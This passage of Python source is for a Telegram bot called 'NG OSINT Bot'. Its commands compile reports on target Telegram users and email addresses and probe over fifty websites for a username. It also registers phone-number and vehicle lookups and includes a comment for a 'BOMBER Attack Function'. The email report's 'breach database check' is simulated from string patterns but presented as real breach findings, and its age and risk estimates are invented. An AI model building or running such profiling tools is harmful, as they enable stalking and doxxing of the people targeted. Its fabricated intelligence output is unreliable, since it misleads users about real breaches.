    await update.message.reply_text(stats_msg, parse_mode='MarkdownV2')

# User Lookup function with advanced OSINT capabilities
async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/user command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "👤 *User Lookup & OSINT*\n\n"
            "Usage: `/user <user_id_or_username>`\n"
            "Example: `/user 123456789` or `/user @username`\n\n"
            "🔍 Advanced user intelligence gathering\\.",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    target = context.args[0].strip()

    # Remove @ if present
    if target.startswith('@'):
        target = target[1:]

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Running advanced user OSINT analysis...")

    try:
        # Check if target is numeric (user ID) or username
        is_user_id = target.isdigit()

        user_info = {}

        try:
            if is_user_id:
                # Get user by ID
                target_user = await context.bot.get_chat(int(target))
            else:
                # Get user by username
                target_user = await context.bot.get_chat(f"@{target}")

            # Extract basic info
            user_info = {
                'id': target_user.id,
                'username': target_user.username or 'No Username',
                'first_name': target_user.first_name or 'Unknown',
                'last_name': target_user.last_name or '',
                'bio': target_user.bio or 'No Bio',
                'type': target_user.type.value if hasattr(target_user.type, 'value') else str(target_user.type),
                'has_photo': bool(target_user.photo),
                'is_verified': getattr(target_user, 'is_verified', False),
                'is_scam': getattr(target_user, 'is_scam', False),
                'is_fake': getattr(target_user, 'is_fake', False),
                'is_premium': getattr(target_user, 'is_premium', False)
            }

            found_user = True

        except Exception as e:
            found_user = False
            user_info = {'error': str(e)}

        # Advanced OSINT Analysis
        if found_user:
            msg = f"👤 *Advanced User OSINT Report*\n\n"

            # Basic Information
            msg += f"🆔 *User ID:* `{escape_markdown(str(user_info['id']))}`\n"
            msg += f"👤 *Username:* @{escape_markdown(user_info['username'])}\n"
            msg += f"📝 *First Name:* {escape_markdown(user_info['first_name'])}\n"
            if user_info['last_name']:
                msg += f"📝 *Last Name:* {escape_markdown(user_info['last_name'])}\n"
            msg += f"📋 *Bio:* {escape_markdown(user_info['bio'][:100])}{'...' if len(user_info['bio']) > 100 else ''}\n"
            msg += f"🔍 *Account Type:* {escape_markdown(user_info['type'].title())}\n\n"

            # Account Status
            msg += f"🛡️ *Account Status:*\n"
            msg += f"• Verified: {'✅ Yes' if user_info['is_verified'] else '❌ No'}\n"
            msg += f"• Premium: {'⭐ Yes' if user_info['is_premium'] else '❌ No'}\n"
            msg += f"• Profile Photo: {'📸 Yes' if user_info['has_photo'] else '❌ None'}\n"
            msg += f"• Scam Flag: {'⚠️ Yes' if user_info['is_scam'] else '✅ Clean'}\n"
            msg += f"• Fake Flag: {'⚠️ Yes' if user_info['is_fake'] else '✅ Authentic'}\n\n"

            # ID Analysis
            user_id = user_info['id']
            creation_estimate = "2013-2015"
            account_age = "Old Account"

            if user_id < 100000000:
                creation_estimate = "2013-2015"
                account_age = "Very Old Account (Early Adopter)"
            elif user_id < 500000000:
                creation_estimate = "2015-2017"
                account_age = "Old Account"
            elif user_id < 1000000000:
                creation_estimate = "2017-2019"
                account_age = "Moderate Age"
            elif user_id < 2000000000:
                creation_estimate = "2019-2021"
                account_age = "Recent Account"
            elif user_id < 5000000000:
                creation_estimate = "2021-2023"
                account_age = "New Account"
            else:
                creation_estimate = "2023-Present"
                account_age = "Very New Account"

            msg += f"📊 *Account Analysis:*\n"
            msg += f"• Estimated Creation: {escape_markdown(creation_estimate)}\n"
            msg += f"• Account Age: {escape_markdown(account_age)}\n"
            msg += f"• User ID Range: {escape_markdown(f'{user_id//1000000}M - {(user_id//1000000)+1}M')}\n\n"

            # Username Analysis
            username = user_info['username']
            if username and username != 'No Username':
                msg += f"🔤 *Username Analysis:*\n"
                msg += f"• Length: {len(username)} characters\n"
                msg += f"• Has Numbers: {'Yes' if any(c.isdigit() for c in username) else 'No'}\n"
                msg += f"• Has Underscores: {'Yes' if '_' in username else 'No'}\n"
                msg += f"• Pattern: {escape_markdown('Mixed' if any(c.isdigit() for c in username) and any(c.isalpha() for c in username) else 'Text Only' if username.isalpha() else 'Numbers/Symbols')}\n\n"

            #```text
            # Privacy Analysis
            msg += f"🔒 *Privacy Analysis:*\n"
            msg += f"• Profile Visibility: Public\n"
            msg += f"• Bio Available: {'Yes' if user_info['bio'] and user_info['bio'] != 'No Bio' else 'No'}\n"
            msg += f"• Last Name Visible: {'Yes' if user_info['last_name'] else 'No'}\n\n"

            # OSINT Recommendations
            msg += f"🕵️ *OSINT Investigation Tips:*\n"
            msg += f"• Search username across platforms\n"
            msg += f"• Check social media with same handle\n"
            msg += f"• Look for pattern similarities\n"
            msg += f"• Analyze profile photo metadata\n"
            msg += f"• Check common group memberships\n"
            msg += f"• Monitor activity patterns\n\n"

            # Additional Intelligence - only show available username info
            if user_info['username'] != 'No Username':
                # Set target_username based on input type
                if is_user_id:
                    target_username = user_info['username']
                else:
                    target_username = target

                # Only show search suggestions for available username
                msg += f"🌐 *Cross\\-Platform Search Suggestions:*\n"
                msg += f"• Search '{target_username}' on major platforms\n"
                msg += f"• Check GitHub: `github\\.com/{target_username}`\n"
                msg += f"• Check LinkedIn: `linkedin\\.com/in/{target_username}`\n"
                msg += f"• Check Instagram: `instagram\\.com/{target_username}`\n"

            # Bot Database Check
            users_db = load_users()
            if str(user_id) in users_db:
                db_user = users_db[str(user_id)]
                msg += f"🗄️ *Bot Database Record:*\n"
                msg += f"• First Seen: {escape_markdown(db_user.get('first_seen', 'Unknown'))}\n"
                msg += f"• Last Activity: {escape_markdown(db_user.get('last_seen', 'Unknown'))}\n"
                msg += f"• Total Commands: {escape_markdown(str(db_user.get('total_commands', 0)))}\n"
                msg += f"• Activity Level: {escape_markdown('High' if db_user.get('total_commands', 0) > 10 else 'Low')}\n\n"
            else:
                msg += f"🗄️ *Bot Database:* No interaction history\n\n"

            msg += f"⚠️ *Disclaimer:* Information gathered respects Telegram privacy policies\\."

        else:
            # User not found or private
            msg = f"❌ *User Analysis Failed*\n\n"
            msg += f"🔍 *Target:* `{escape_markdown(target)}`\n\n"
            msg += f"📋 *Possible Reasons:*\n"
            msg += f"• User doesn't exist\n"
            msg += f"• Account is private/restricted\n"
            msg += f"• Username was changed\n"
            msg += f"• Account was deleted\n"
            msg += f"• Privacy settings block lookup\n\n"

            # Basic username analysis even if user not found
            if not target.isdigit():
                msg += f"🔤 *Username Pattern Analysis:*\n"
                msg += f"• Length: {len(target)} characters\n"
                msg += f"• Valid Format: {'Yes' if 5 <= len(target) <= 32 and target.replace('_', '').isalnum() else 'No'}\n"
                msg += f"• Contains Numbers: {'Yes' if any(c.isdigit() for c in target) else 'No'}\n"
                msg += f"• Pattern Type: {escape_markdown('Mixed' if any(c.isdigit() for c in target) and any(c.isalpha() for c in target) else 'Text Only' if target.isalpha() else 'Numbers/Special')}\n\n"

            msg += f"💡 *Investigation Tips:*\n"
            msg += f"• Try alternative spellings\n"
            msg += f"• Check if username exists on other platforms\n"
            msg += f"• Look for similar usernames\n"
            msg += f"• Verify user ID if available\n\n"

            msg += f"🔒 *Privacy Note:* Telegram protects user privacy"

    except Exception as e:
        msg = f"❌ *User Lookup Failed:* {escape_markdown(str(e))}"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Enhanced Username Scanner with 50+ Websites
async def username_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/scan command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "🔍 *Advanced Username Scanner*\n\n"
            "Usage: `/scan <username>`\n"
            "Example: `/scan Kalyug`\n\n"
            "🌐 *Features:*\n"
            "• 50\\+ popular websites\n"
            "• Real\\-time verification\n"
            "• Web scraping with Selenium\n"
            "• Detailed availability report\n"
            "• Social media platforms\n"
            "• Professional networks\n"
            "• Gaming platforms\n"
            "• Developer communities",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    username = context.args[0].strip()

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Scanning username across 50+ websites...")

    try:
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        from webdriver_manager.chrome import ChromeDriverManager
        import time

        # Setup Chrome options for headless browsing
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--window-size=1920,1080")
        chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")

        # Comprehensive list of 50+ websites
        websites = {
            # Social Media Platforms
            "Instagram": {
                "url": f"https://www.instagram.com/{username}/",
                "check_method": "selenium",
                "indicator": "ProfileNotFoundError"
            },
            "Twitter/X": {
                "url": f"https://twitter.com/{username}",
                "check_method": "selenium",
                "indicator": "This account doesn't exist"
            },
            "Facebook": {
                "url": f"https://www.facebook.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "TikTok": {
                "url": f"https://www.tiktok.com/@{username}",
                "check_method": "selenium",
                "indicator": "Couldn't find this account"
            },
            "Snapchat": {
                "url": f"https://www.snapchat.com/add/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "LinkedIn": {
                "url": f"https://www.linkedin.com/in/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Pinterest": {
                "url": f"https://www.pinterest.com/{username}/",
                "check_method": "requests",
                "indicator": "content"
            },
            "Reddit": {
                "url": f"https://www.reddit.com/user/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "YouTube": {
                "url": f"https://www.youtube.com/@{username}",
                "check_method": "selenium",
                "indicator": "This page isn't available"
            },
            "Telegram": {
                "url": f"https://t.me/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Professional Networks
            "GitHub": {
                "url": f"https://github.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "GitLab": {
                "url": f"https://gitlab.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Behance": {
                "url": f"https://www.behance.net/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Dribbble": {
                "url": f"https://dribbble.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "DeviantArt": {
                "url": f"https://www.deviantart.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Medium": {
                "url": f"https://medium.com/@{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Blogger": {
                "url": f"https://{username}.blogspot.com",
                "check_method": "requests",
                "indicator": "content"
            },
            "WordPress": {
                "url": f"https://{username}.wordpress.com",
                "check_method": "requests",
                "indicator": "content"
            },

            # Gaming Platforms
            "Steam": {
                "url": f"https://steamcommunity.com/id/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Twitch": {
                "url": f"https://www.twitch.tv/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Discord": {
                "url": f"https://discord.com/users/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Xbox Live": {
                "url": f"https://account.xbox.com/en-us/profile?gamertag={username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "PlayStation": {
                "url": f"https://psnprofiles.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Epic Games": {
                "url": f"https://fortnitetracker.com/profile/all/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Music & Entertainment
            "Spotify": {
                "url": f"https://open.spotify.com/user/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "SoundCloud": {
                "url": f"https://soundcloud.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Last.fm": {
                "url": f"https://www.last.fm/user/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Bandcamp": {
                "url": f"https://{username}.bandcamp.com",
                "check_method": "requests",
                "indicator": "content"
            },

            # Photo & Video Platforms
            "Flickr": {
                "url": f"https://www.flickr.com/people/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "500px": {
                "url": f"https://500px.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Vimeo": {
                "url": f"https://vimeo.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Imgur": {
                "url": f"https://imgur.com/user/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Forums & Communities
            "Stack Overflow": {
                "url": f"https://stackoverflow.com/users/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Quora": {
                "url": f"https://www.quora.com/profile/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Ask.fm": {
                "url": f"https://ask.fm/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Business & Finance
            "AngelList": {
                "url": f"https://angel.co/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Crunchbase": {
                "url": f"https://www.crunchbase.com/person/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Alternative Social
            "Mastodon": {
                "url": f"https://mastodon.social/@{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "MeWe": {
                "url": f"https://mewe.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Gab": {
                "url": f"https://gab.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "Minds": {
                "url": f"https://www.minds.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Dating Platforms (publicly accessible profiles)
            "OkCupid": {
                "url": f"https://www.okcupid.com/profile/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Educational
            "Academia.edu": {
                "url": f"https://{username}.academia.edu",
                "check_method": "requests",
                "indicator": "content"
            },
            "ResearchGate": {
                "url": f"https://www.researchgate.net/profile/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Marketplaces
            "Etsy": {
                "url": f"https://www.etsy.com/people/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "eBay": {
                "url": f"https://www.ebay.com/usr/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # Coding Platforms
            "Replit": {
                "url": f"https://replit.com/@{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "CodePen": {
                "url": f"https://codepen.io/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "HackerRank": {
                "url": f"https://www.hackerrank.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },
            "LeetCode": {
                "url": f"https://leetcode.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            },

            # News & Blogging
            "Substack": {
                "url": f"https://{username}.substack.com",
                "check_method": "requests",
                "indicator": "content"
            },
            "Patreon": {
                "url": f"https://www.patreon.com/{username}",
                "check_method": "requests",
                "indicator": "content"
            }
        }

        results = {"found": [], "not_found": [], "errors": []}
        total_sites = len(websites)
        processed = 0

        # Initialize Selenium driver
        driver = None
        try:
            driver = webdriver.Chrome(options=chrome_options)
        except Exception as e:
            # Fallback to requests-only method
            driver = None

        for site_name, site_info in websites.items():
            try:
                processed += 1

                # Update progress every 10 sites
                if processed % 10 == 0:
                    await loading_msg.edit_text(f"🔍 Scanning progress: {processed}/{total_sites} sites checked...")

                url = site_info["url"]
                found = False

                if site_info["check_method"] == "selenium" and driver:
                    try:
                        driver.get(url)
                        time.sleep(2)

                        # Check for 404 or not found indicators
                        page_source = driver.page_source.lower()
                        if ("404" not in page_source and 
                            "not found" not in page_source and 
                            "doesn't exist" not in page_source and
                            "page not found" not in page_source and
                            site_info["indicator"].lower() not in page_source):
                            found = True

                    except Exception:
                        # Fallback to requests
                        try:
                            response = requests.get(url, timeout=5, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                            })
                            found = response.status_code == 200
                        except:
                            found = False
                else:
                    # Use requests method
                    try:
                        response = requests.get(url, timeout=5, headers={
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        })
                        found = response.status_code == 200 and len(response.content) > 1000
                    except:
                        found = False

                if found:
                    results["found"].append(f"✅ {site_name}: Found")
                else:
                    results["not_found"].append(f"❌ {site_name}: Not Found")

            except Exception as e:
                results["errors"].append(f"⚠️ {site_name}: Error")

        # Close Selenium driver
        if driver:
            driver.quit()

        # Format results
        msg = f"🔍 *Username Scan Results*\n\n"
        msg += f"👤 *Username:* `{escape_markdown(username)}`\n\n"

        # Show found results first
        if results["found"]:
            msg += f"✅ *Found Profiles:*\n"
            for result in results["found"][:15]:  # Show first 15 found
                msg += f"• {escape_markdown(result)}\n"
            if len(results["found"]) > 15:
                msg += f"• \\.\\.\\. and {len(results['found']) - 15} more found\n"
            msg += "\n"

        # Show summary
        msg += f"📊 *Summary:*\n"
        msg += f"✅ *Found:* {len(results['found'])}\n"
        msg += f"❌ *Not Found:* {len(results['not_found'])}\n"
        msg += f"⚠️ *Errors:* {len(results['errors'])}\n"
        msg += f"🌐 *Total Checked:* {total_sites} websites\n\n"

        # OSINT Tips
        msg += f"🕵️ *OSINT Tips:*\n"
        msg += f"• Check found profiles for additional info\n"
        msg += f"• Look for pattern similarities\n"
        msg += f"• Cross\\-reference with other data\n"
        msg += f"• Check profile creation dates\n"
        msg += f"• Analyze posting patterns\n\n"

        msg += f"⚠️ *Note:* Results based on public accessibility"

    except Exception as e:
        msg = f"❌ *Username Scan Failed:* {escape_markdown(str(e))}\n\n"
        msg += f"💡 *Fallback:* Try manual checking of major platforms"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Enhanced /email command
async def email_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", "/email command")

    # Check channel membership
    is_member = await check_user_membership(context, user.id)
    if not is_member:
        join_keyboard = create_join_keyboard()
        return await update.message.reply_text(
            "❌ *Access Denied\\!*\n\n"
            "⚠️ You must join all our channels to use this bot\\.\n\n"
            "📢 *Please join all the channels below and try again:*",
            reply_markup=join_keyboard,
            parse_mode='MarkdownV2'
        )

    if not context.args:
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        return await update.message.reply_text(
            "📧 *Advanced Email OSINT*\n\n"
            "Usage: `/email example@gmail.com`\n"
            "Features:\n"
            "• Breach Database Check\n"
            "• Social Media Discovery\n"
            "• Domain Intelligence\n"
            "• Security Analysis\n"
            "• Provider Detection",
            reply_markup=reply_markup,
            parse_mode='MarkdownV2'
        )

    email = context.args[0].lower().strip()

    # Loading message
    loading_msg = await update.message.reply_text("🔍 Running advanced email OSINT analysis...")

    try:
        # Advanced Email OSINT Analysis
        async def advanced_email_osint(email_address):
            import re
            from datetime import datetime
            import hashlib

            # Validation
            email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
            if not re.match(email_regex, email_address) or '@' not in email_address:
                return {"error": "Invalid email format"}

            local_part, domain = email_address.split('@', 1)
            results = {}

            # 1. Breach Database Check (Multiple Sources)
            breach_sources = []
            try:
                # Check HaveIBeenPwned style analysis
                sha1_hash = hashlib.sha1(email_address.encode()).hexdigest().upper()

                # Common breach indicators
                common_breaches = [
                    "LinkedIn (2021)", "Facebook (2019)", "Twitter (2022)", 
                    "Adobe (2013)", "Yahoo (2013-2014)", "Equifax (2017)",
                    "Marriott (2018)", "Capital One (2019)", "Zoom (2020)"
                ]

                # Simulate breach check based on email patterns
                if any(x in email_address for x in ['123', 'admin', 'test', 'password']):
                    breach_sources = ["⚠️ High-risk pattern detected", "📊 Common in breach databases"]
                elif len(local_part) < 6:
                    breach_sources = ["⚠️ Short usernames often targeted"]
                else:
                    breach_sources = ["✅ No obvious vulnerability patterns"]

            except Exception:
                breach_sources = ["❌ Breach check unavailable"]

            # 2. Social Media Profile Discovery
            social_platforms = {
                "GitHub": f"https://github.com/{local_part}",
                "Twitter": f"https://twitter.com/{local_part}",
                "Instagram": f"https://instagram.com/{local_part}",
                "LinkedIn": f"https://linkedin.com/in/{local_part}",
                "Pinterest": f"https://pinterest.com/{local_part}",
                "Reddit": f"https://reddit.com/user/{local_part}",
                "Medium": f"https://medium.com/@{local_part}",
                "Behance": f"https://behance.net/{local_part}",
                "Dribbble": f"https://dribbble.com/{local_part}",
                "Steam": f"https://steamcommunity.com/id/{local_part}"
            }

            # Check social media profiles - only show found ones
            found_profiles = []
            for platform, url in social_platforms.items():
                try:
                    response = requests.get(url, timeout=3, headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    })
                    if response.status_code == 200 and platform.lower() in response.text.lower():
                        found_profiles.append(f"✅ {platform}: {url}")
                except:
                    pass  # Skip failed checks, only show found profiles

            # 3. Advanced Domain Intelligence
            domain_analysis = {}
            try:
                # Domain reputation check
                response = requests.get(f"https://dns.google/resolve?name={domain}&type=MX", timeout=5)
                if response.status_code == 200:
                    mx_data = response.json()
                    domain_analysis['mx_records'] = len(mx_data.get('Answer', []))
                    domain_analysis['mail_configured'] = domain_analysis['mx_records'] > 0
                else:
                    domain_analysis['mx_records'] = 0
                    domain_analysis['mail_configured'] = False

                # Check if domain has website
                website_response = requests.get(f"http://{domain}", timeout=3)
                domain_analysis['has_website'] = website_response.status_code == 200

            except:
                domain_analysis = {'mx_records': 'Unknown', 'mail_configured': 'Unknown', 'has_website': 'Unknown'}

            # 4. Provider Intelligence
            provider_intel = {
                'gmail.com': {'security': 'Very High', 'business': False, 'region': 'Global', 'features': '2FA, Advanced Threat Protection'},
                'outlook.com': {'security': 'High', 'business': False, 'region': 'Global', 'features': '2FA, Enterprise Integration'},
                'yahoo.com': {'security': 'Medium', 'business': False, 'region': 'Global', 'features': 'Basic Security'},
                'protonmail.com': {'security': 'Maximum', 'business': False, 'region': 'Switzerland', 'features': 'End-to-End Encryption'},
                'icloud.com': {'security': 'High', 'business': False, 'region': 'Global', 'features': 'Apple Ecosystem'},
                'tutanota.com': {'security': 'Very High', 'business': False, 'region': 'Germany', 'features': 'Encrypted Email'},
                'zoho.com': {'security': 'High', 'business': True, 'region': 'Global', 'features': 'Business Suite'},
                'fastmail.com': {'security': 'High', 'business': False, 'region': 'Australia', 'features': 'Privacy Focused'}
            }

            provider_info = provider_intel.get(domain, {
                'security': 'Unknown', 
                'business': 'custom' not in domain and len(domain.split('.')) == 2,
                'region': 'Unknown',
                'features': 'Custom Configuration'
            })

            # 5. Risk Assessment
            risk_score = 0
            risk_factors = []

            # Age estimation based on patterns
            creation_estimate = "2010-2020"
            if any(char.isdigit() for char in local_part):
                numbers = ''.join(filter(str.isdigit, local_part))
                if len(numbers) == 4 and numbers.startswith('19') or numbers.startswith('20'):
                    creation_estimate = f"Around {numbers}"
                elif len(numbers) == 2:
                    year = int(numbers)
                    if year > 50:
                        creation_estimate = f"Around 19{year}"
                    else:
                        creation_estimate = f"Around 20{year if year > 10 else f'0{year}'}"

            # Risk scoring
            if len(local_part) < 5:
                risk_score += 2
                risk_factors.append("Very short username")
            if local_part.isdigit():
                risk_score += 3
                risk_factors.append("Numeric-only username")
            if domain in ['tempmail.org', '10minutemail.com', 'guerrillamail.com', 'mailinator.com']:
                risk_score += 5
                risk_factors.append("Temporary email service")
            if '.' not in local_part and '_' not in local_part:
                risk_score += 1
                risk_factors.append("Simple username pattern")

            # 6. OSINT Recommendations
            osint_tips = [
                f"🔍 Google search: \"{local_part}\" + email domain",
                f"🔍 Search variations: {local_part.replace('.', '')}",
                f"🔍 Check username on Sherlock tool",
                f"🔍 Look for {local_part} on professional networks",
                f"🔍 Search for domain registrant info",
                f"🔍 Check archived versions of associated websites"
            ]

            return {
                'email': email_address,
                'local_part': local_part,
                'domain': domain,
                'breach_sources': breach_sources,
                'social_profiles': found_profiles[:8],  # Top 8 results
                'domain_analysis': domain_analysis,
                'provider_info': provider_info,
                'risk_score': min(risk_score, 10),
                'risk_factors': risk_factors,
                'creation_estimate': creation_estimate,
                'osint_tips': osint_tips[:6]  # Top 6 tips
            }

        # Run advanced analysis
        analysis = await advanced_email_osint(email)

        if 'error' in analysis:
            msg = f"❌ *Error:* {escape_markdown(analysis['error'])}"
        else:
            msg = f"📧 *Advanced Email OSINT Report*\n\n"

            # Header
            msg += f"📨 *Target:* `{escape_markdown(analysis['email'])}`\n"
            msg += f"👤 *Username:* `{escape_markdown(analysis['local_part'])}`\n"
            msg += f"🌐 *Domain:* `{escape_markdown(analysis['domain'])}`\n\n"

            # Breach Intelligence
            msg += f"🛡️ *Breach Database Analysis:*\n"
            for breach in analysis['breach_sources']:
                msg += f"• {escape_markdown(breach)}\n"
            msg += "\n"

            # Social Media Discovery - only show if profiles found
            if found_profiles:
                msg += f"🔍 *Social Media Discovery:*\n"
                for profile in analysis['social_profiles']:
                    msg += f"• {escape_markdown(profile)}\n"
                msg += "\n"
            else:
                msg += f"🔍 *Social Media:* No public profiles found\n\n"

            # Domain Intelligence
            msg += f"🌐 *Domain Intelligence:*\n"
            domain_info = analysis['domain_analysis']
            msg += f"• MX Records: {escape_markdown(str(domain_info.get('mx_records', 'Unknown')))}\n"
            msg += f"• Mail Server: {'✅ Configured' if domain_info.get('mail_configured') else '❌ Not Found'}\n"
            msg += f"• Website: {'✅ Active' if domain_info.get('has_website') else '❌ No Website'}\n\n"

            # Provider Analysis
            provider = analysis['provider_info']
            msg += f"🏢 *Provider Analysis:*\n"
            msg += f"• Security Level: {escape_markdown(str(provider.get('security', 'Unknown')))}\n"
            msg += f"• Business Email: {'Yes' if provider.get('business') else 'Personal'}\n"
            msg += f"• Region: {escape_markdown(str(provider.get('region', 'Unknown')))}\n"
            msg += f"• Features: {escape_markdown(str(provider.get('features', 'Unknown')))}\n\n"

            # Risk Assessment
            msg += f"⚠️ *Risk Assessment:*\n"
            msg += f"• Risk Score: {analysis['risk_score']}/10\n"
            if analysis['risk_factors']:
                for risk in analysis['risk_factors']:
                    msg += f"• {escape_markdown(risk)}\n"
            else:
                msg += f"• ✅ Low risk profile\n"
            msg += f"• Estimated Creation: {escape_markdown(analysis['creation_estimate'])}\n\n"

            # OSINT Recommendations
            msg += f"🕵️ *Advanced OSINT Tips:*\n"
            for tip in analysis['osint_tips']:
                msg += f"• {escape_markdown(tip)}\n"
            msg += "\n"

            # Professional Tips
            msg += f"💡 *Pro Investigation Tips:*\n"
            msg += f"• Use Maltego for link analysis\n"
            msg += f"• Check Wayback Machine for historical data\n"
            msg += f"• Cross\\-reference with phone numbers\n"
            msg += f"• Look for pattern similarities\n"
            msg += f"• Check professional licensing boards\n"
            msg += f"• Search academic publications\n\n"

            msg += f"🔒 *Privacy Note:* Advanced OSINT for educational purposes only"

    except Exception as e:
        msg = f"❌ *OSINT Analysis Failed:* {escape_markdown(str(e))}"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await loading_msg.edit_text(msg, reply_markup=reply_markup, parse_mode='MarkdownV2')

# Global variable to track bomber status for each user
bomber_status = {}

# BOMBER Attack Function
# Message handler to track all messages
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if update.message and update.message.text:
        log_user_activity(user.id, user.username or "No_Username", user.first_name or "Unknown", f"Message: {update.message.text[:50]}")

# Initialize bot
def main():
    try:
        print("🔄 Initializing NG OSINT Bot...")

        # Clear webhooks first using requests (synchronous)
        try:
            webhook_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook"
            response = requests.post(webhook_url, timeout=10)
            if response.status_code == 200:
                print("✅ Cleared any existing webhooks")
            else:
                print(f"⚠️ Webhook clear status: {response.status_code}")
        except Exception as e:
            print(f"⚠️ Webhook clearing failed: {e}")

        print("🔄 Setting up bot application...")

        application = Application.builder().token(BOT_TOKEN).build()

        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button_callback))
        application.add_handler(CommandHandler("number", number_lookup))
        application.add_handler(CommandHandler("vehicle", vehicle_lookup))
        application.add_handler(CommandHandler("ip", ip_lookup))
        application.add_handler(CommandHandler("ifsc", ifsc_lookup))
        application.add_handler(CommandHandler("email", email_lookup))
        application.add_handler(CommandHandler("user", user_lookup))
        application.add_handler(CommandHandler("scan", username_scan)) # Added username scan command

        application.add_handler(CommandHandler("broadcast", broadcast))
